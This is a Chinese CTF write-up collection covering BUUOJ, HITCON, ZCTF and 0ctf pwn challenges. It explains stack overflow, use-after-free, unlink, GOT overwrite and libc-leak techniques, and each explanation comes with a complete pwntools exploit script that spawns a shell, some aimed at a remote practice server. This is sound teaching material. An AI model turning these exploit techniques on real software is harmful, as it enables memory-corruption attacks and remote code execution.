<h2 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h2><p>程序流程是：可以泄漏一个地址，然后可以跳到任意一个地址</p>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506155959849.png" alt="image-20210506155959849"></p>
<p>方法：泄漏puts的got表地址，计算libc地址，然后跳到one_gadget即可。</p>
<h3 id="完整exp-4"><a href="#完整exp-4" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process("./oneshot_tjctf_2016")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27763</span>)</span><br><span class="line">elf=ELF(<span class="string">"./oneshot_tjctf_2016"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Read location?"</span>)</span><br><span class="line">p.sendline(str(puts_got))</span><br><span class="line">p.recvuntil(<span class="string">"Value: 0x"</span>)</span><br><span class="line">puts_addr = int(p.recv(<span class="number">16</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment"># onegadget = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line">onegadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Jump location?"</span>)</span><br><span class="line">p.sendline(str(onegadget[<span class="number">0</span>]+libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a>cmcc_pwnme1</h2><p>栈溢出</p>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506161229152.png" alt="image-20210506161229152"></p>
<p>有后门函数</p>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506161244074.png" alt="image-20210506161244074"></p>
<p>故得exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process("./pwnme1")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25575</span>)</span><br><span class="line">elf=ELF(<span class="string">"./oneshot_tjctf_2016"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x08048677</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; 6. Exit    "</span>)</span><br><span class="line">p.sendline(str(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">"fruit:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(get_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506161308542.png" alt="image-20210506161308542"></p>
<p>但是环境原因，flag在/home/ctf下面的flag或者flag.txt，所以没有拿到flag</p>
<h3 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h3><ol>
<li>泄漏libc地址</li>
<li>找到system和binsh</li>
<li>栈溢出</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process("./pwnme1")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25575</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwnme1"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23-32.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">get_fruit = <span class="number">0x08048624</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x08048677</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; 6. Exit    "</span>)</span><br><span class="line">p.sendline(str(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">"fruit:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(puts_plt)+p32(get_fruit)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">log.success(hex(system))</span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"fruit:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(system)+p32(get_fruit)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf-wiki的刷题笔记</title>
    <url>/2020/11/11/02-45/</url>
    <content><![CDATA[<h1 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h1><h2 id="HITCON-training-lab-10-hacknote"><a href="#HITCON-training-lab-10-hacknote" class="headerlink" title="HITCON-training  - lab 10 hacknote"></a>HITCON-training  - lab 10 hacknote</h2><p>存在uaf漏洞</p>
<p><img src="/2020/11/11/02-45/image-20201111032646916.png" alt="image-20201111032646916"></p>
<p>note的结构是，有两个属性put和content</p>
<p><img src="/2020/11/11/02-45/image-20201111032057852.png" alt="image-20201111032057852"></p>
<p><img src="/2020/11/11/02-45/image-20201111032726035.png" alt="image-20201111032726035"></p>
<p>puts函数存放的是print_note_content函数指针，输出的时候会调用这个函数，content属性是存放内容的堆指针。</p>
<p><img src="/2020/11/11/02-45/image-20201111032835613.png" alt="image-20201111032835613"></p>
<p>存在后门函数magic</p>
<p>所以，只要修改puts属性为magic属性，那么在show的时候，就会调用magic函数，get flag。</p>
<p>申请一个堆块，会建立两个堆，一个存放输出信息，一个存放内容</p>
<p><img src="/2020/11/11/02-45/image-20201111032951397.png" alt="image-20201111032951397"></p>
<p>这里，0x11的是notelist结构题，存放的是puts和content两个指针。</p>
<p>如果我们把这两个堆块都释放了，那么他们都进入了fastbin</p>
<p><img src="/2020/11/11/02-45/image-20201111033120082.png" alt="image-20201111033120082"></p>
<p>如果此时我们申请一个和notelist长度一样的堆块，那么它会把原先的两个0x11给我们，一个作为notelist一个作为content，但是content我们是可控的，放入magic，再输出，即调用magic函数。</p>
<p><img src="/2020/11/11/02-45/image-20201111033408089.png" alt="image-20201111033408089"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./hacknote"</span>)</span><br><span class="line"><span class="comment">#context.log_level  ='debug'</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"size :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"dex :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"dex :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="string">"bbbb"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,p32(magic)*<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/104730157" target="_blank" rel="noopener">https://blog.csdn.net/qq_43935969/article/details/104730157</a></p>
<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><h2 id="2014-hitcon-stkof"><a href="#2014-hitcon-stkof" class="headerlink" title="2014_hitcon_stkof"></a>2014_hitcon_stkof</h2><h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><ul>
<li><p>如果题目中给出了libc文件，用ida打开，搜索字符串，搜索version<img src="/2020/11/11/02-45/image-20201108030310873.png" alt="image-20201108030310873"></p>
</li>
<li><p>如果题目没有给出libc文件，需要一个个尝试</p>
<ul>
<li><p>堆的话试试UAF啥的</p>
<p>​    要么2.23、要么2.27、2.31就喷他</p>
</li>
<li><p>栈溢出那就leak一下就行了</p>
</li>
</ul>
</li>
</ul>
<h3 id="got表和plt表"><a href="#got表和plt表" class="headerlink" title="got表和plt表"></a>got表和plt表</h3><ul>
<li><strong>.got</strong></li>
</ul>
<p>GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。</p>
<ul>
<li><strong>.plt</strong></li>
</ul>
<p>PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址</p>
<ul>
<li><strong>.got.plt</strong></li>
</ul>
<p>这个是 GOT 专门为 PLT 专门准备的节。说白了，<strong>.got.plt 中的值是 GOT 的一部分</strong>。它包含上述  PLT 表所需地址（已经找到的和需要去触发的）</p>
<p>我们说的覆写plt表指的是.got.plt，通过调试得出</p>
<p><img src="/2020/11/11/02-45/image-20201108032958022.png" alt="image-20201108032958022"></p>
<h3 id="第一个add"><a href="#第一个add" class="headerlink" title="第一个add"></a>第一个add</h3><p>没有setbuf，把输入输出缓冲区申请好。</p>
<h3 id="globals（head）"><a href="#globals（head）" class="headerlink" title="globals（head）"></a>globals（head）</h3><p>所有chunk存储的位置</p>
<p>chunk开始的地方</p>
<p><img src="/2020/11/11/02-45/image-20201108031201127.png" alt="image-20201108031201127"></p>
<p><img src="/2020/11/11/02-45/image-20201108010322075.png" alt="image-20201108010322075"></p>
<p>v2是分配的数据指针，而v2是存储在bss段上的，没有开启pie，所以是不变的。</p>
<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p><img src="/2020/11/11/02-45/image-20201108012152824.png" alt="image-20201108012152824"></p>
<p>edit函数中，因为修改的长度是自己输入的，那我想改多少改多少，存在堆溢出</p>
<h3 id="unlink的具体操作"><a href="#unlink的具体操作" class="headerlink" title="unlink的具体操作"></a>unlink的具体操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line"><span class="comment"># small chunk size inorder to trigger unlink</span></span><br><span class="line">alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line"><span class="comment"># a fake chunk at global[2]=head+16 who's size is 0x20</span></span><br><span class="line">payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)  <span class="comment">#fd</span></span><br><span class="line">payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)  <span class="comment">#bk</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk's prev_size bypass the check</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># overwrite global[3]'s chunk's prev_size</span></span><br><span class="line"><span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, len(payload), payload)</span><br><span class="line"><span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>分配两个chunk，对第一个chunk进行修改，其中bk和fd放成<code>target - 12</code>和<code>target - 8</code></p>
<p>20是因为-12和-8是伪造一个堆块，大小为0x10，被释放了，所以，检查机制会看下一个堆块的prev_size</p>
<p>30和90是下一个chunk的头，也就是上chunk3的上一个chunk在chunk2，90表示被释放了</p>
<h5 id="unlink的结果"><a href="#unlink的结果" class="headerlink" title="unlink的结果"></a>unlink的结果</h5><p><img src="/2020/11/11/02-45/image-20201108031435390.png" alt="image-20201108031435390"></p>
<p>所以，接下来往chunk2写入数据就会从0x602138开始。。。</p>
<p>注意的是：0x602140仍旧是global[0]的起始地址，那么，覆盖40-58的地址，用global[0\1\2]就可以调用到。</p>
<p>执行结果如下：</p>
<p><img src="/2020/11/11/02-45/image-20201108031836380.png" alt="image-20201108031836380"></p>
<h3 id="got表"><a href="#got表" class="headerlink" title="got表"></a>got表</h3><p>所以，现在edit(0)，就会往第一个地址里面写入数据。</p>
<p>如果第一个是某个got表地址，那么写入的话，got表里面的内容就可能被替换掉了。</p>
<h3 id="free-1"><a href="#free-1" class="headerlink" title="free(1)"></a>free(1)</h3><p>因为这里，第一个指针地址是puts的got表地址（参数），free的got表也被替换为puts的plt表（原来的执行plt实际上就是执行.got.plt，所以一样），所以执行free函数的话，执行的是put.plt，参数是puts的got表地址</p>
<h3 id="edit-2-len-payload-payload"><a href="#edit-2-len-payload-payload" class="headerlink" title="edit(2, len(payload), payload)"></a>edit(2, len(payload), payload)</h3><p>这里修改的2就直接是88，atoi的got表里面的数据，然后继续执行的时候，会让输入，把binsh给他们就行。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./stkof"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">head = <span class="number">0x00602140</span></span><br><span class="line"><span class="comment">#x/30gx 0x00602140</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)</span><br><span class="line">payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x0</span>)+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:] + <span class="string">'\x00\x00'</span>)</span><br><span class="line">print(<span class="string">"[*]puts_addr:"</span>,hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">p.send(p64(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p>对于程序自己重写read等功能，要看一下，因为很可能就是做了一定的变动，导致可能存在某个漏洞。</p>
<p><img src="/2020/11/11/02-45/image-20201111021534976.png" alt="image-20201111021534976"></p>
<p>本题中主要是ReadStr这个函数，由于是i是无符号数，所以在比较<code>len - 1 &gt; i</code>时，会把它转换为无符号数，如果len = 0，那么长度就变成了0xfffffffff，如果<code>ReadStr(note, size, 10);</code>就可以往note里面写入很多的数据，造成堆溢出。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本题的主要漏洞就在于这个点，利用堆溢出，可以实现unlink功能。</p>
<p>堆块的指针存在于ptr，地址为<code>0x00602120</code></p>
<p>首先申请一个块，由于有大小限制，就申请最大的0x80，在里面伪造块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x00602120</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x8</span> + p64(<span class="number">0x60</span>)<span class="comment">#0x60和0x61都可</span></span><br><span class="line">payload += p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">64</span></span><br><span class="line">payload += p64(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x80</span>,payload)</span><br></pre></td></tr></table></figure>
<p>因为只有大小为0的才能栈溢出，所以我们申请一个大小为0的块作为中介。</p>
<p>但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。</p>
<p>最后再申请一个正常的堆块，0x80。</p>
<p>这时，堆布局如下：</p>
<p><img src="/2020/11/11/02-45/image-20201111022359588.png" alt="image-20201111022359588"></p>
<p>因为大小为0的堆块只有在add的时候，读入才堆溢出。所以我们先把它释放，再重新申请，因为大小一样，会把释放掉的给我们重新分配回来。</p>
<p>这时候，就可以把下一个堆块的头给覆盖了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x8</span>*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>因为是释放chunk3，却要让它unlink chunk1，所以prev_size要是和chunk1的距离，这样，chunk3会根据自己的地址 - prev_size找到前一个chunk是chunk1。</p>
<p>然后free2，就成功unlink了。</p>
<p><img src="/2020/11/11/02-45/image-20201111022859025.png" alt="image-20201111022859025"></p>
<p>然后，就可以正常了。</p>
<p>覆盖指针的地址为atoi_got表地址，show泄漏他的地址，找到libc基址，找到system的地址，然后覆盖原来的atoi_got的地址，然后执行的atoi函数的时候，发送‘/bin/sh’即可，这里可以是它的地址也可以是字符串。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./note2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./note2"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<span class="comment">#给的libc版本是2.19但是不好使呀，要用2.23的</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.sendline(<span class="string">"winter"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address:"</span>)</span><br><span class="line">p.sendline(<span class="string">"qh"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"(less than 128)"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"id of the note:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,choice,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">" the note:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"[1.overwrite/2.append]"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"the note:"</span>)</span><br><span class="line">	p.sendline(str(idx))	</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x00602120</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x8</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">64</span></span><br><span class="line">payload += p64(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">"bbbbbbbb"</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x8</span>*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">atoi_got = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = atoi_got - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">payload = p64(system)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">p.sendline(p64(binsh))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="unlink总结"><a href="#unlink总结" class="headerlink" title="unlink总结"></a>unlink总结</h2><ol>
<li>要伪造堆块</li>
<li>可以溢出覆盖下一个堆块的头</li>
<li>unlink是函数指针</li>
</ol>
<blockquote>
<p>unlink先到这里，，等有空再做剩下几题。。。</p>
</blockquote>
<h1 id="花式栈溢出技巧"><a href="#花式栈溢出技巧" class="headerlink" title="花式栈溢出技巧"></a>花式栈溢出技巧</h1><h2 id="stack-pivoting（栈迁移）"><a href="#stack-pivoting（栈迁移）" class="headerlink" title="stack pivoting（栈迁移）"></a>stack pivoting（栈迁移）</h2><p>第一题是直接用jmp esp进行栈迁移的</p>
<p><img src="/2020/11/11/02-45/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20201112211503737.png" alt="image-20201112211503737"></p>
<p>题目很简单，一个栈溢出，但是溢出字节不是很多，只有50 - 0x20-0x4（ebp） = 14个字节，难以利用。</p>
<p>因为这里是存在栈上而不是bss段上，所以不能用ret2shellcode（不知道输入的具体地址）</p>
<p>所以</p>
<h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p><img src="/2020/11/11/02-45/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20201118233314339.png" alt="image-20201118233314339"></p>
<p>64位的程序，保护全开</p>
<p><img src="/2020/11/11/02-45/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20201118233342993.png" alt="image-20201118233342993"></p>
<p>填充内容的时候，长度是重新输入的，可以填充任意长度，造成栈溢出</p>
<p><img src="/2020/11/11/02-45/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20201118233449344.png" alt="image-20201118233449344"></p>
<p>没有uaf</p>
